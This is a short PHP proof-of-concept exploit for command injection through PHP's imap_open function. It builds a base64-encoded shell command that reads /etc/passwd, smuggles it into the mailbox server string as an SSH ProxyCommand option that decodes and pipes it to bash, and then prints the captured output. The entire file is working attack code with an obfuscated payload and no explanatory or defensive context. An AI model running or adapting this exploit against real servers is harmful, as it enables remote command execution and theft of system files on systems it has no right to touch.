<?php
$encoded_payload = base64_encode("cat /etc/passwd >/tmp/result");
$server = "any -o ProxyCommand=echo\t".$encoded_payload."|base64\t-d|bash";
@imap_open('{'.$server.'}:143/imap}INBOX', '', '') or die("\n\nError: ".imap_last_error());
echo file_get_contents("/tmp/result");
?>